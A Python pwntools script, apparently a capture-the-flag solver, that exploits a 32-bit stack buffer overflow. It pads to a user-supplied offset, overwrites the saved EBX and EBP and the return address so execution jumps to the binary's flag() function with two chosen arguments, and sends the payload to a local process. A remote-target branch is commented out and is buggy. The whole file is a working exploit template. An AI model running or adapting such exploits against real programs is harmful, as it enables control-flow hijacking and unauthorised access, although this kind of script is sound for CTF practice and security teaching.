#!/usr/bin/env python3

from pwn import *
from colorama import Fore

offset = input("Specify Offset: ")

buff = 'A' * int(offset)

program_name = input('Please specify the program to overflow. ')
program_name = program_name.strip()

program = ELF(program_name)

function_address = program.symbols['flag']

EBP = b'BBBB'

EBX = 0x0804bf10

EIP = p32(function_address)

FILL = b'CCCC'

Arg1 = 0xdeadbeef

Arg2 = 0xc0ded00d

payload = buff.encode() + p32(EBX) + EBP + EIP + FILL + p32(Arg1) + p32(Arg2)

#Remote_or_Local = input('Remote or Local? ')

#if Remote_or_Local == 'Remote' or 'remote':
#    binary = remote(remote_ip.strip(), remote_port)
#    remote_ip = input("Enter Target IP: ")
#    remote_port = int(input("Enter Target Port: "), 10)
#elif Remote_or_Local == 'Local' or 'local':
#    binary = process(program_name)
#else:
#    print("Enter either \'remote\' or \'local\'")
binary = process(program_name)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())
